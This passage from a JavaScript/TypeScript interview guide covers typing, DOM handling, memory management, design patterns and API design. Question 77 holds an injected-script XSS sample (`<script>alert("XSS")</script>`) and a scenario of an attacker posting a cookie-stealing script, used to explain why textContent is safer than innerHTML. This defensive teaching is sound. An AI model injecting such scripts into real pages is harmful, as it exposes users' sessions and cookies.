interface AdminUser extends User {
  permissions: string[];
}

// Can be merged (declaration merging):
interface User {
  age?: number;  // Merges with previous definition
}

// Type - more flexible:
type User = {
  id: number;
  name: string;
  email: string;
};

// Types can do unions (interfaces can't):
type Status = 'active' | 'inactive' | 'pending';

// Types can do intersections:
type AdminUser = User & {
  permissions: string[];
};

// Types can be computed:
type UserKeys = keyof User;  // 'id' | 'name' | 'email'

// When to use which:
// Use interface for:
// - Object shapes that might be extended
// - Public APIs (better error messages)
interface ApiResponse {
  data: any;
  status: number;
}

// Use type for:
// - Unions, intersections, computed types
// - Type aliases for primitives
type ID = string | number;
type Nullable<T> = T | null;
```

---

### Question 75: How does TypeScript's type inference work?

#### Definition
Type inference is TypeScript guessing types without you explicitly writing them - like a smart assistant that figures out what you mean. TypeScript looks at how you use variables and infers their types. For example, if you assign `5` to a variable, TypeScript infers it's a `number`. You can be explicit with type annotations, or let TypeScript infer when it's obvious.

#### Real-World Scenario / Case Study
A developer wrote `const data = fetchData()` without a type. TypeScript inferred `any`, losing type safety. When the API response structure changed, TypeScript didn't catch the mismatch, causing runtime errors. Adding explicit return types to functions and proper type annotations caught these issues at compile time, preventing production bugs.

#### Example Code
```ts
// Type inference - TypeScript figures out types:
const name = 'John';  // Inferred as string
const age = 30;       // Inferred as number
const isActive = true;  // Inferred as boolean

// Function return type inferred:
function add(a: number, b: number) {
  return a + b;  // Inferred return type: number
}

// Array type inferred:
const numbers = [1, 2, 3];  // Inferred as number[]

// Object type inferred:
const user = {
  name: 'John',
  age: 30
};  // Inferred as { name: string; age: number }

// BUGGY - inference can be wrong:
async function fetchData() {
  const response = await fetch('/api/data');
  return response.json();  // Inferred as Promise<any>
}

const data = await fetchData();
data.name;  // No error, but data might not have name!

// FIX - explicit types:
interface ApiData {
  name: string;
  age: number;
}

async function fetchData(): Promise<ApiData> {
  const response = await fetch('/api/data');
  return response.json();  // Now typed as Promise<ApiData>
}

const data = await fetchData();
data.name;  // TypeScript knows this exists
data.invalid;  // Error: Property 'invalid' does not exist
```

---

### Question 76: What are TypeScript generics and when should you use them?

#### Definition
Generics are like placeholders for types - you write code that works with any type, and specify the actual type when you use it. It's like a function that can work with numbers, strings, or any type you give it. Instead of writing separate functions for each type, you write one generic function. The `<T>` syntax means "type T" - you can use any letter.

#### Real-World Scenario / Case Study
A team had duplicate functions for arrays of different types: `getFirstUser(users: User[])`, `getFirstPost(posts: Post[])`, etc. Each function did the same thing but for different types. Using generics, they created one `getFirst<T>(items: T[])` function that worked for all types. This reduced code duplication and made the codebase more maintainable.

#### Example Code
```ts
// Without generics - duplicate code:
function getFirstUser(users: User[]): User {
  return users[0];
}

function getFirstPost(posts: Post[]): Post {
  return posts[0];
}

// With generics - one function for all types:
function getFirst<T>(items: T[]): T | undefined {
  return items[0];
}

// Usage:
const user = getFirst<User>(users);      // T is User
const post = getFirst<Post>(posts);      // T is Post
const number = getFirst<number>([1, 2, 3]);  // T is number

// TypeScript can often infer the type:
const user = getFirst(users);  // TypeScript infers T = User

// Generic interfaces:
interface Repository<T> {
  findById(id: number): Promise<T>;
  save(entity: T): Promise<T>;
  delete(id: number): Promise<void>;
}

// Usage:
const userRepo: Repository<User> = {
  findById: async (id) => { /* ... */ },
  save: async (user) => { /* ... */ },
  delete: async (id) => { /* ... */ }
};

// Generic constraints:
function getProperty<T, K extends keyof T>(obj: T, key: K): T[K] {
  return obj[key];
}

const user = { name: 'John', age: 30 };
const name = getProperty(user, 'name');  // TypeScript knows return type is string
const age = getProperty(user, 'age');   // TypeScript knows return type is number
```

---

## DOM Manipulation

### Question 77: What is the difference between `innerHTML`, `textContent`, and `innerText`?

#### Definition
`innerHTML` gets/sets HTML content - it parses HTML tags. `textContent` gets/sets plain text, ignoring HTML. `innerText` is like `textContent` but respects CSS (hides text in hidden elements). `innerHTML` is powerful but dangerous (XSS risk). `textContent` is safer for user input. `innerText` is slower because it considers styling.

#### Real-World Scenario / Case Study
A comment system used `innerHTML` to display user comments. An attacker posted `<script>stealCookies()</script>` which executed in other users' browsers. The fix was using `textContent` which treats input as plain text, preventing script execution. Performance also improved because `textContent` is faster than `innerHTML`.

#### Example Code
```js
const div = document.createElement('div');

// innerHTML - parses HTML (DANGEROUS with user input):
div.innerHTML = '<strong>Hello</strong> World';
console.log(div.innerHTML);  // "<strong>Hello</strong> World"
// Renders as bold "Hello World"

div.innerHTML = '<script>alert("XSS")</script>';  // Executes script!

// textContent - plain text only (SAFE):
div.textContent = '<strong>Hello</strong> World';
console.log(div.textContent);  // "<strong>Hello</strong> World"
// Displays literally as text, doesn't parse HTML

div.textContent = '<script>alert("XSS")</script>';  // Safe, displays as text

// innerText - respects CSS:
div.innerHTML = 'Hello <span style="display:none">Hidden</span> World';
console.log(div.innerText);  // "Hello World" (hides hidden element)
console.log(div.textContent);  // "Hello Hidden World" (shows all text)

// Performance:
// textContent: fastest
// innerText: slowest (considers CSS)
// innerHTML: medium (parses HTML)
```

---

### Question 78: How do you efficiently manipulate the DOM?

#### Definition
DOM manipulation is slow, so you want to minimize it. Instead of updating the DOM many times, batch changes together. Use `DocumentFragment` to build elements off-screen, then add them all at once. Cache DOM queries instead of searching repeatedly. Use event delegation instead of many event listeners. It's like doing all your shopping in one trip instead of many small trips.

#### Real-World Scenario / Case Study
A list component was adding items one by one, causing 100+ DOM updates and 2-second freezes. Each item addition triggered a reflow. Batching updates into a `DocumentFragment` and adding all items at once reduced updates to 1 and time to 50ms. The UI became responsive again.

#### Example Code
```js
// BUGGY - many DOM updates:
function addItems(items) {
  const list = document.getElementById('list');
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item.name;
    list.appendChild(li);  // DOM update for each item - slow!
  });
  // 100 items = 100 DOM updates
}

// FIX - use DocumentFragment:
function addItems(items) {
  const list = document.getElementById('list');
  const fragment = document.createDocumentFragment();
  
  items.forEach(item => {
    const li = document.createElement('li');
    li.textContent = item.name;
    fragment.appendChild(li);  // No DOM update yet
  });
  
  list.appendChild(fragment);  // Single DOM update - fast!
  // 100 items = 1 DOM update
}

// BUGGY - querying DOM repeatedly:
function updateItems() {
  document.getElementById('item1').textContent = 'New 1';
  document.getElementById('item2').textContent = 'New 2';
  document.getElementById('item3').textContent = 'New 3';
  // Queries DOM 3 times
}

// FIX - cache queries:
function updateItems() {
  const item1 = document.getElementById('item1');
  const item2 = document.getElementById('item2');
  const item3 = document.getElementById('item3');
  
  item1.textContent = 'New 1';
  item2.textContent = 'New 2';
  item3.textContent = 'New 3';
  // Queries DOM once, reuses references
}

// Event delegation - one listener instead of many:
// BAD:
items.forEach(item => {
  item.addEventListener('click', handleClick);  // 100 listeners
});

// GOOD:
list.addEventListener('click', (e) => {
  if (e.target.tagName === 'LI') {
    handleClick(e.target);  // 1 listener handles all
  }
});
```

---

## Memory Management

### Question 79: What causes memory leaks in JavaScript and how to prevent them?

#### Definition
Memory leaks happen when JavaScript keeps references to objects that are no longer needed, preventing garbage collection. Common causes: event listeners not removed, closures holding large objects, global variables, timers not cleared, or circular references. It's like leaving lights on - memory keeps growing until the browser crashes. Prevention means cleaning up: remove listeners, clear timers, null out references.

#### Real-World Scenario / Case Study
A single-page app was using 2GB of memory after 30 minutes, causing browser crashes. The issue was event listeners on removed DOM elements - the closures held references to large data objects. Even after elements were removed, the listeners kept the data in memory. Adding proper cleanup (removing listeners, clearing references) fixed the leaks and kept memory under 100MB.

#### Example Code
```js
// MEMORY LEAK - event listener not removed:
function createComponent(data) {
  const element = document.createElement('div');
  element.addEventListener('click', () => {
    console.log(data.someProperty);  // Closure holds reference to data
  });
  document.body.appendChild(element);
  
  // If element removed, listener still holds data in memory!
}

// FIX - remove listener:
function createComponent(data) {
  const element = document.createElement('div');
  const handler = () => {
    console.log(data.someProperty);
  };
  element.addEventListener('click', handler);
  document.body.appendChild(element);
  
  // Return cleanup function:
  return () => {
    element.removeEventListener('click', handler);
    element.remove();
    data = null;  // Clear reference
  };
}

// MEMORY LEAK - timer not cleared:
function startPolling() {
  setInterval(() => {
    fetchData();  // Runs forever, even if component unmounted
  }, 1000);
}

// FIX - clear interval:
function startPolling() {
  const intervalId = setInterval(() => {
    fetchData();
  }, 1000);
  
  return () => clearInterval(intervalId);  // Cleanup
}

// MEMORY LEAK - global variables:
window.cache = {};  // Never garbage collected

function addToCache(key, value) {
  window.cache[key] = value;  // Grows forever
}

// FIX - use WeakMap or limit cache size:
const cache = new WeakMap();  // Allows garbage collection

// Or limit size:
const cache = new Map();
const MAX_SIZE = 100;

function addToCache(key, value) {
  if (cache.size >= MAX_SIZE) {
    const firstKey = cache.keys().next().value;
    cache.delete(firstKey);  // Remove oldest
  }
  cache.set(key, value);
}
```

---

### Question 80: How does JavaScript's garbage collection work?

#### Definition
Garbage collection is JavaScript automatically freeing memory for objects that are no longer reachable - like a janitor cleaning up unused rooms. JavaScript uses mark-and-sweep: it marks all objects that are still referenced (reachable), then sweeps away (deletes) everything that wasn't marked. Objects become unreachable when nothing references them anymore. The process happens automatically in the background.

#### Real-World Scenario / Case Study
An app was creating thousands of temporary objects per second. The garbage collector ran frequently, causing 100-200ms pauses that made the UI stutter. By reusing objects (object pooling) and reducing object creation, the team reduced GC pressure. Fewer collections meant fewer pauses, improving UI smoothness from 30fps to 60fps.

#### Example Code
```js
// Objects become garbage when unreachable:
function createData() {
  const data = { value: 42 };  // Object created
  return data;
}

const myData = createData();  // Reference kept
// data object is reachable, not garbage

myData = null;  // No more references
// data object is now unreachable, will be garbage collected

// Circular references are handled:
let obj1 = { name: 'obj1' };
let obj2 = { name: 'obj2' };

obj1.ref = obj2;  // obj1 references obj2
obj2.ref = obj1;  // obj2 references obj1 (circular)

obj1 = null;
obj2 = null;
// Both objects unreachable (no external references)
// Garbage collector can handle circular references

// Weak references don't prevent garbage collection:
const weakMap = new WeakMap();
let obj = { data: 'important' };

weakMap.set(obj, 'some value');
obj = null;  // obj can be garbage collected
// WeakMap entry is automatically removed

// BUGGY - preventing garbage collection:
const cache = [];
function processData(data) {
  cache.push(data);  // Keeps reference forever
  // Cache grows forever, data never garbage collected
}

// FIX - use WeakMap or limit cache:
const cache = new WeakMap();  // Doesn't prevent GC
function processData(data) {
  cache.set(data, processedValue);
  // If data becomes unreachable, cache entry is removed
}
```

---

## Design Patterns

### Question 81: What is the Singleton pattern and when should you use it?

#### Definition
Singleton ensures only one instance of a class exists - like having only one manager in a store. No matter how many times you try to create it, you get the same instance. Useful for things like database connections, configuration, or logging where you want a single shared instance. It's like a shared whiteboard that everyone uses, not individual boards.

#### Real-World Scenario / Case Study
A Node.js app was creating multiple database connection pools, exhausting the database connection limit. Each module created its own pool. Implementing a Singleton pattern ensured only one connection pool existed, shared across all modules. This fixed the connection limit errors and improved connection reuse.

#### Example Code
```js
// Singleton pattern:
class DatabaseConnection {
  constructor() {
    if (DatabaseConnection.instance) {
      return DatabaseConnection.instance;
    }
    
    this.connection = createConnection();
    DatabaseConnection.instance = this;
    return this;
  }
}

// Usage:
const db1 = new DatabaseConnection();
const db2 = new DatabaseConnection();
console.log(db1 === db2);  // true - same instance

// Module pattern singleton:
const Config = (function() {
  let instance;
  
  function createInstance() {
    return {
      apiUrl: 'https://api.example.com',
      timeout: 5000
    };
  }
  
  return {
    getInstance: function() {
      if (!instance) {
        instance = createInstance();
      }
      return instance;
    }
  };
})();

const config1 = Config.getInstance();
const config2 = Config.getInstance();
console.log(config1 === config2);  // true
```

---

### Question 82: What is the Observer pattern and how is it used in JavaScript?

#### Definition
Observer pattern is like a newsletter subscription - objects (observers) subscribe to events from a subject (publisher). When something happens, the subject notifies all subscribers. It's a way for objects to communicate without directly knowing about each other. Event emitters, React's state updates, and many frameworks use this pattern.

#### Real-World Scenario / Case Study
A UI needed to update multiple components when data changed. Direct coupling meant changing one component required updating others. Implementing the Observer pattern allowed components to subscribe to data changes. When data updated, all subscribers were notified automatically, reducing coupling and making the code more maintainable.

#### Example Code
```js
// Observer pattern implementation:
class Subject {
  constructor() {
    this.observers = [];
  }
  
  subscribe(observer) {
    this.observers.push(observer);
  }
  
  unsubscribe(observer) {
    this.observers = this.observers.filter(obs => obs !== observer);
  }
  
  notify(data) {
    this.observers.forEach(observer => observer.update(data));
  }
}

class Observer {
  constructor(name) {
    this.name = name;
  }
  
  update(data) {
    console.log(`${this.name} received:`, data);
  }
}

// Usage:
const subject = new Subject();
const observer1 = new Observer('Observer 1');
const observer2 = new Observer('Observer 2');

subject.subscribe(observer1);
subject.subscribe(observer2);

subject.notify('New data');  // Both observers notified

// Real-world: Event system
class EventEmitter {
  constructor() {
    this.events = {};
  }
  
  on(event, callback) {
    if (!this.events[event]) {
      this.events[event] = [];
    }
    this.events[event].push(callback);
  }
  
  emit(event, data) {
    if (this.events[event]) {
      this.events[event].forEach(callback => callback(data));
    }
  }
}
```

---

### Question 83: What is the Factory pattern and when is it useful?

#### Definition
Factory pattern is like a factory that creates objects for you - you tell it what you want, and it creates the right type. Instead of using `new` directly with complex constructors, you call a factory function that handles the creation logic. Useful when object creation is complex or you want to centralize creation logic. It's like ordering from a menu instead of cooking yourself.

#### Real-World Scenario / Case Study
A system needed to create different types of API clients (REST, GraphQL, WebSocket) based on configuration. Using `new` directly required complex conditionals everywhere. A factory function centralized the creation logic, making it easier to add new client types and test. The code became cleaner and more maintainable.

#### Example Code
```js
// Factory pattern:
class RESTClient {
  constructor(config) {
    this.baseUrl = config.baseUrl;
  }
}

class GraphQLClient {
  constructor(config) {
    this.endpoint = config.endpoint;
  }
}

class WebSocketClient {
  constructor(config) {
    this.url = config.url;
  }
}

// Factory function:
function createClient(type, config) {
  switch (type) {
    case 'rest':
      return new RESTClient(config);
    case 'graphql':
      return new GraphQLClient(config);
    case 'websocket':
      return new WebSocketClient(config);
    default:
      throw new Error(`Unknown client type: ${type}`);
  }
}

// Usage:
const restClient = createClient('rest', { baseUrl: 'https://api.com' });
const graphqlClient = createClient('graphql', { endpoint: '/graphql' });

// Factory with registration:
class ClientFactory {
  constructor() {
    this.creators = {};
  }
  
  register(type, creator) {
    this.creators[type] = creator;
  }
  
  create(type, config) {
    const creator = this.creators[type];
    if (!creator) {
      throw new Error(`Unknown type: ${type}`);
    }
    return creator(config);
  }
}

const factory = new ClientFactory();
factory.register('rest', (config) => new RESTClient(config));
const client = factory.create('rest', { baseUrl: 'https://api.com' });
```

---

### Question 84: What is the Strategy pattern and how does it work?

#### Definition
Strategy pattern lets you choose an algorithm at runtime - like choosing a payment method (credit card, PayPal, crypto). Instead of hardcoding one way to do something, you define multiple strategies and pick which one to use. It makes code flexible - you can swap algorithms without changing the code that uses them. It's like having multiple tools and choosing the right one for the job.

#### Real-World Scenario / Case Study
A payment system had if/else chains for different payment methods, making it hard to add new methods. Refactoring to the Strategy pattern allowed adding new payment methods by creating new strategy classes, without modifying existing code. The code became more testable and maintainable.

#### Example Code
```js
// Strategy pattern:
class PaymentStrategy {
  pay(amount) {
    throw new Error('pay() must be implemented');
  }
}

class CreditCardStrategy extends PaymentStrategy {
  constructor(cardNumber, cvv) {
    super();
    this.cardNumber = cardNumber;
    this.cvv = cvv;
  }
  
  pay(amount) {
    console.log(`Paid ${amount} using credit card`);
  }
}

class PayPalStrategy extends PaymentStrategy {
  constructor(email) {
    super();
    this.email = email;
  }
  
  pay(amount) {
    console.log(`Paid ${amount} using PayPal`);
  }
}

class PaymentProcessor {
  constructor(strategy) {
    this.strategy = strategy;
  }
  
  setStrategy(strategy) {
    this.strategy = strategy;
  }
  
  processPayment(amount) {
    this.strategy.pay(amount);
  }
}

// Usage:
const processor = new PaymentProcessor(new CreditCardStrategy('1234', '123'));
processor.processPayment(100);

processor.setStrategy(new PayPalStrategy('user@example.com'));
processor.processPayment(200);

// Without strategy pattern (bad):
function processPayment(method, amount) {
  if (method === 'creditcard') {
    // Credit card logic
  } else if (method === 'paypal') {
    // PayPal logic
  } else if (method === 'crypto') {
    // Crypto logic
  }
  // Hard to extend, violates open/closed principle
}
```

---

### Question 85: What is the Decorator pattern and when to use it?

#### Definition
Decorator pattern adds behavior to objects dynamically - like adding toppings to a pizza. You wrap an object with decorators that add functionality without changing the original object. Each decorator adds its own behavior while keeping the same interface. It's like layers - you can add logging, caching, validation, etc., one layer at a time.

#### Real-World Scenario / Case Study
An API client needed logging, caching, retry logic, and rate limiting. Instead of one complex class, decorators added each feature separately. This made the code modular - you could use any combination of features. Testing became easier because each decorator could be tested independently.

#### Example Code
```js
// Decorator pattern:
class Coffee {
  cost() {
    return 5;
  }
  
  description() {
    return 'Coffee';
  }
}

class MilkDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 2;
  }
  
  description() {
    return this.coffee.description() + ', Milk';
  }
}

class SugarDecorator {
  constructor(coffee) {
    this.coffee = coffee;
  }
  
  cost() {
    return this.coffee.cost() + 1;
  }
  
  description() {
    return this.coffee.description() + ', Sugar';
  }
}

// Usage:
let coffee = new Coffee();
coffee = new MilkDecorator(coffee);
coffee = new SugarDecorator(coffee);

console.log(coffee.description());  // "Coffee, Milk, Sugar"
console.log(coffee.cost());  // 8

// Real-world: API client decorators
class ApiClient {
  async request(url) {
    return fetch(url);
  }
}

class LoggingDecorator {
  constructor(client) {
    this.client = client;
  }
  
  async request(url) {
    console.log(`Requesting: ${url}`);
    const response = await this.client.request(url);
    console.log(`Response: ${response.status}`);
    return response;
  }
}

class CachingDecorator {
  constructor(client) {
    this.client = client;
    this.cache = new Map();
  }
  
  async request(url) {
    if (this.cache.has(url)) {
      return this.cache.get(url);
    }
    const response = await this.client.request(url);
    this.cache.set(url, response);
    return response;
  }
}

// Usage:
let client = new ApiClient();
client = new LoggingDecorator(client);
client = new CachingDecorator(client);
await client.request('/api/data');
```

---

## API Design & Integration

### Question 86: How do you design RESTful APIs effectively?

#### Definition
RESTful APIs use HTTP methods (GET, POST, PUT, DELETE) to represent actions on resources. Resources are nouns (users, posts), actions are verbs (GET users, POST users). URLs should be clean and hierarchical. Use proper HTTP status codes. Return consistent JSON formats. It's like a library system - you GET books, POST new books, PUT updates, DELETE books, all through clear, predictable URLs.

#### Real-World Scenario / Case Study
An API mixed GET and POST inconsistently, used custom status codes, and had inconsistent response formats. Developers spent hours figuring out how to use it. Standardizing on REST principles with consistent URLs, HTTP methods, status codes, and response formats made the API intuitive. Documentation became simpler, and integration time dropped 70%.

#### Example Code
```js
// RESTful API design:
// Resources as nouns, actions as HTTP methods:

// GET - retrieve resources
GET /api/users          // List all users
GET /api/users/123       // Get user 123
GET /api/users/123/posts // Get posts by user 123

// POST - create resources
POST /api/users          // Create new user
Body: { name: 'John', email: 'john@example.com' }

// PUT - update entire resource
PUT /api/users/123
Body: { name: 'John Doe', email: 'john@example.com' }

// PATCH - partial update
PATCH /api/users/123
Body: { name: 'John Doe' }

// DELETE - remove resource
DELETE /api/users/123

// Proper status codes:
app.get('/api/users/:id', async (req, res) => {
  const user = await getUser(req.params.id);
  
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  res.status(200).json(user);
});

app.post('/api/users', async (req, res) => {
  try {
    const user = await createUser(req.body);
    res.status(201).json(user);  // 201 Created
  } catch (error) {
    res.status(400).json({ error: error.message });  // 400 Bad Request
  }
});

// Consistent response format:
{
  "data": { ... },           // Success data
  "error": null,             // Error object
  "meta": {                  // Metadata
    "page": 1,
    "total": 100
  }
}
```

---

### Question 87: How do you handle API versioning?

#### Definition
API versioning lets you change your API without breaking existing clients. When you need to make breaking changes, you create a new version while keeping the old one working. Common approaches: URL versioning (`/api/v1/users`), header versioning (`Accept: application/vnd.api+json;version=1`), or query parameter (`?version=1`). It's like having different editions of a book - old readers can still use v1, new readers use v2.

#### Real-World Scenario / Case Study
An API changed response formats, breaking all existing mobile apps. Users couldn't use the app until updates were released. Implementing URL-based versioning (`/v1/`, `/v2/`) allowed maintaining old versions while introducing new ones. Mobile apps continued using v1 while web apps migrated to v2, preventing service disruption.

#### Example Code
```js
// URL versioning (most common):
app.use('/api/v1', v1Routes);
app.use('/api/v2', v2Routes);

// v1 routes:
router.get('/users', (req, res) => {
  res.json({ users: [...] });  // Old format
});

// v2 routes:
router.get('/users', (req, res) => {
  res.json({ 
    data: { users: [...] },
    meta: { page: 1 }
  });  // New format
});

// Header versioning:
app.use((req, res, next) => {
  const version = req.headers['api-version'] || '1';
  req.apiVersion = version;
  next();
});

app.get('/api/users', (req, res) => {
  if (req.apiVersion === '2') {
    return res.json({ data: { users: [...] } });
  }
  return res.json({ users: [...] });
});

// Query parameter versioning:
app.get('/api/users', (req, res) => {
  const version = req.query.version || '1';
  if (version === '2') {
    return res.json({ data: { users: [...] } });
  }
  return res.json({ users: [...] });
});

// Version middleware:
function versionRouter(version) {
  return (req, res, next) => {
    req.apiVersion = version;
    next();
  };
}

app.use('/api/v1', versionRouter('1'), v1Routes);
app.use('/api/v2', versionRouter('2'), v2Routes);
```

---

### Question 88: How do you implement pagination in APIs?

#### Definition
Pagination splits large result sets into smaller pages - like showing 10 search results per page instead of 1000 at once. Common approaches: offset-based (skip first N, take next M) or cursor-based (start from this ID). Offset is simpler but slow for large offsets. Cursor is faster and handles new data better. Include metadata about total count, page numbers, and next/previous links.

#### Real-World Scenario / Case Study
An API returned all 10,000 products in one response, causing 30+ second load times and memory issues. Implementing pagination with 20 items per page reduced response time to 200ms. Initially using offset-based pagination caused slow queries on later pages. Switching to cursor-based pagination improved performance for all pages.

#### Example Code
```js
// Offset-based pagination:
app.get('/api/products', async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = parseInt(req.query.limit) || 20;
  const offset = (page - 1) * limit;
  
  const [products, total] = await Promise.all([
    db.query('SELECT * FROM products LIMIT ? OFFSET ?', [limit, offset]),
    db.query('SELECT COUNT(*) as count FROM products')
  ]);
  
  res.json({
    data: products,
    pagination: {
      page,
      limit,
      total: total[0].count,
      totalPages: Math.ceil(total[0].count / limit),
      hasNext: page * limit < total[0].count,
      hasPrev: page > 1
    }
  });
});

// Cursor-based pagination (better for large datasets):
app.get('/api/products', async (req, res) => {
  const limit = parseInt(req.query.limit) || 20;
  const cursor = req.query.cursor;  // Last seen ID
  
  let query = 'SELECT * FROM products';
  let params = [limit + 1];  // Fetch one extra to check if more exists
  
  if (cursor) {
    query += ' WHERE id > ?';
    params.unshift(cursor);
  }
  
  query += ' ORDER BY id LIMIT ?';
  
  const products = await db.query(query, params);
  const hasMore = products.length > limit;
  
  if (hasMore) {
    products.pop();  // Remove extra item
  }
  
  res.json({
    data: products,
    pagination: {
      limit,
      hasMore,
      nextCursor: hasMore ? products[products.length - 1].id : null
    }
  });
});

// Usage:
// GET /api/products?cursor=123&limit=20
// Response includes nextCursor for next page
```

---

### Question 89: How do you handle API errors and status codes properly?

#### Definition
Proper error handling means using correct HTTP status codes and consistent error formats. 4xx codes mean client errors (bad request, not found, unauthorized). 5xx codes mean server errors (internal error, service unavailable). Always return errors in a consistent JSON format with clear messages. Don't leak sensitive information in error messages. It's like road signs - clear codes tell developers what went wrong.

#### Real-World Scenario / Case Study
An API returned 200 OK for all responses, even errors, with error info in the body. Clients had to parse response bodies to detect errors, causing bugs. Some errors returned 500 for client mistakes. Standardizing on proper status codes (400 for bad requests, 404 for not found, 500 for server errors) and consistent error format made error handling reliable and debuggable.

#### Example Code
```js
// Proper error handling:
// 400 - Bad Request (client error)
app.post('/api/users', async (req, res) => {
  if (!req.body.email || !req.body.name) {
    return res.status(400).json({
      error: {
        code: 'VALIDATION_ERROR',
        message: 'Email and name are required',
        fields: ['email', 'name']
      }
    });
  }
  
  // ...
});

// 401 - Unauthorized (authentication failed)
app.get('/api/profile', requireAuth, (req, res) => {
  if (!req.user) {
    return res.status(401).json({
      error: {
        code: 'UNAUTHORIZED',
        message: 'Authentication required'
      }
    });
  }
  
  res.json({ user: req.user });
});

// 403 - Forbidden (authorization failed)
app.delete('/api/users/:id', requireAuth, async (req, res) => {
  if (req.user.id !== req.params.id && req.user.role !== 'admin') {
    return res.status(403).json({
      error: {
        code: 'FORBIDDEN',
        message: 'You do not have permission to delete this user'
      }
    });
  }
  
  // ...
});

// 404 - Not Found
app.get('/api/users/:id', async (req, res) => {
  const user = await getUser(req.params.id);
  if (!user) {
    return res.status(404).json({
      error: {
        code: 'NOT_FOUND',
        message: `User with id ${req.params.id} not found`
      }
    });
  }
  
  res.json({ data: user });
});

// 500 - Internal Server Error
app.use((error, req, res, next) => {
  console.error('Server error:', error);
  
  res.status(500).json({
    error: {
      code: 'INTERNAL_ERROR',
      message: process.env.NODE_ENV === 'production' 
        ? 'An internal error occurred'
        : error.message  // Only in development
    }
  });
});

// Consistent error format:
{
  "error": {
    "code": "ERROR_CODE",
    "message": "Human-readable message",
    "details": {}  // Optional additional info
  }
}
```

---

### Question 90: How do you implement rate limiting in APIs?

#### Definition
Rate limiting restricts how many requests a client can make in a time period - like limiting how many books you can check out per day. It prevents abuse, ensures fair usage, and protects servers from overload. Common approaches: fixed window (100 requests per hour), sliding window (100 requests in any 1-hour period), or token bucket. Return proper headers showing limits and remaining requests.

#### Real-World Scenario / Case Study
An API had no rate limiting. One client made 10,000 requests per minute, crashing the server and affecting all users. Implementing rate limiting (100 requests per 15 minutes per IP) stopped the abuse. Legitimate users were unaffected, but abusive clients were blocked. The service became stable and fair for all users.

#### Example Code
```js
// Rate limiting middleware:
const rateLimit = require('express-rate-limit');

// Global rate limit:
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,  // Limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP, please try again later',
  standardHeaders: true,  // Return rate limit info in `RateLimit-*` headers
  legacyHeaders: false,
});

app.use('/api/', limiter);

// Stricter limit for auth endpoints:
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,  // Only 5 login attempts per 15 minutes
  skipSuccessfulRequests: true,  // Don't count successful requests
});

app.post('/api/login', authLimiter, loginHandler);

// Custom rate limit by user:
function userRateLimit(maxRequests, windowMs) {
  const requests = new Map();
  
  return (req, res, next) => {
    const userId = req.user?.id || req.ip;
    const now = Date.now();
    
    if (!requests.has(userId)) {
      requests.set(userId, { count: 1, resetTime: now + windowMs });
      return next();
    }
    
    const record = requests.get(userId);
    
    if (now > record.resetTime) {
      record.count = 1;
      record.resetTime = now + windowMs;
      return next();
    }
    
    if (record.count >= maxRequests) {
      return res.status(429).json({
        error: 'Too many requests',
        retryAfter: Math.ceil((record.resetTime - now) / 1000)
      });
    }
    
    record.count++;
    next();
  };
}

// Response headers:
// X-RateLimit-Limit: 100
// X-RateLimit-Remaining: 95
// X-RateLimit-Reset: 1633024800
```

---

## Advanced Topics

### Question 91: What are Web Workers and when should you use them?

#### Definition
Web Workers let you run JavaScript in background threads, separate from the main thread that handles the UI. This prevents heavy computations from freezing the browser. It's like having a helper do heavy lifting while you keep the store open. Workers can't access the DOM directly, but they can do calculations, process data, and send results back to the main thread.

#### Real-World Scenario / Case Study
An image processing app was freezing the UI for 5+ seconds when processing large images. The processing happened on the main thread, blocking all user interaction. Moving image processing to a Web Worker kept the UI responsive. Users could continue interacting while images processed in the background.

#### Example Code
```js
// Main thread - create worker:
const worker = new Worker('image-processor.js');

worker.postMessage({ imageData: imageArrayBuffer });

worker.onmessage = (event) => {
  const processedImage = event.data;
  displayImage(processedImage);
};

worker.onerror = (error) => {
  console.error('Worker error:', error);
};

// image-processor.js (worker file):
self.onmessage = function(event) {
  const { imageData } = event.data;
  
  // Heavy processing that would block main thread
  const processed = processImage(imageData);
  
  self.postMessage(processed);
};

function processImage(data) {
  // CPU-intensive work
  // Can't access DOM, but can do calculations
  return processedData;
}

// Inline worker:
const workerCode = `
  self.onmessage = function(e) {
    const result = e.data * 2;
    self.postMessage(result);
  };
`;

const blob = new Blob([workerCode], { type: 'application/javascript' });
const worker = new Worker(URL.createObjectURL(blob));
```

---

### Question 92: What is the difference between `WeakMap` and `Map`?

#### Definition
`Map` holds strong references - objects in a Map can't be garbage collected as long as the Map exists. `WeakMap` holds weak references - objects can be garbage collected even if they're in a WeakMap. WeakMap keys must be objects (not primitives), and you can't iterate over WeakMap. Use WeakMap when you want metadata about objects without preventing garbage collection.

#### Real-World Scenario / Case Study
A system stored metadata about DOM elements in a regular Map. When elements were removed from the DOM, they couldn't be garbage collected because the Map still referenced them. This caused memory leaks. Switching to WeakMap allowed elements to be garbage collected when removed, fixing the memory leak.

#### Example Code
```js
// Map - strong references:
const map = new Map();
let obj = { data: 'important' };

map.set(obj, 'metadata');
obj = null;  // obj still can't be garbage collected!
// Map still holds reference to obj

// WeakMap - weak references:
const weakMap = new WeakMap();
let obj = { data: 'important' };

weakMap.set(obj, 'metadata');
obj = null;  // obj can now be garbage collected
// WeakMap entry is automatically removed

// WeakMap limitations:
const weakMap = new WeakMap();
weakMap.set('string', 'value');  // Error! Keys must be objects
weakMap.set(123, 'value');       // Error! Keys must be objects

// Can't iterate:
for (let key of weakMap) { }  // Error! Not iterable
weakMap.size;  // undefined - no size property

// Use case - metadata without preventing GC:
const elementMetadata = new WeakMap();

function attachMetadata(element, metadata) {
  elementMetadata.set(element, metadata);
  // When element is removed from DOM, it can be GC'd
  // Metadata is automatically cleaned up
}

function getMetadata(element) {
  return elementMetadata.get(element);
}
```

---

### Question 93: What are Proxies in JavaScript and how do they work?

#### Definition
Proxies let you intercept and customize operations on objects - like having a middleman that handles all interactions with an object. You can intercept property access, assignment, function calls, etc. It's like a receptionist who handles all calls to a person, deciding what to forward and what to block. Useful for validation, logging, reactivity systems, or virtual properties.

#### Real-World Scenario / Case Study
A state management system needed to track all property changes for undo/redo. Using Proxies to intercept property assignments allowed automatically logging all changes. When users made changes, the system tracked them without modifying the original objects. This enabled perfect undo/redo functionality.

